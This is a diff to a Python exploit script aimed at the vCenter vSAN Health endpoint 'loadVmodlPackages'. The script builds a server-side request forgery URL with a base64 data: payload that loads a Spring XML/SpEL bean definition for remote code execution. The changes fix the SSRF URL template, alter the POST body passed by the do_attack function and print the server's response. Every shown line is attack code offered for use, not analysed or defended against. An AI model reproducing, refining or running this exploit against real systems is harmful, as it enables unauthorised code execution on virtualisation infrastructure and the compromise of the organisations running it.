@@ -45,7 +45,8 @@ spel_xml = """<beans xmlns="http://www.springframework.org/schema/beans"
     </bean>
 </beans>"""
 
-pyssrf = """https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,%s%23"""
+pyssrf = """https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html;base64,{}#"""
+# pyssrf = """http://localhost:8006/vsanHealth/vum/driverOfflineBundle/data:text/html;base64,{}#"""
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
@@ -102,7 +103,7 @@ class InMemoryZip(object):
 def do_attack(target, payload):
     try:
         url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
-        post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))]]}
+        post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
         result = req.post(url=url, headers=headers, data=json.dumps(post_data), verify=False)
         return result
     except requests.exceptions.RequestException as e:
@@ -131,6 +132,7 @@ def main(argv):
     result = do_attack(target, payload)
     if result == None:
         print("[-] Using other gadgets")
+    print(result.text)
     result = get_echo(target)
     try:
         echo = result.json()
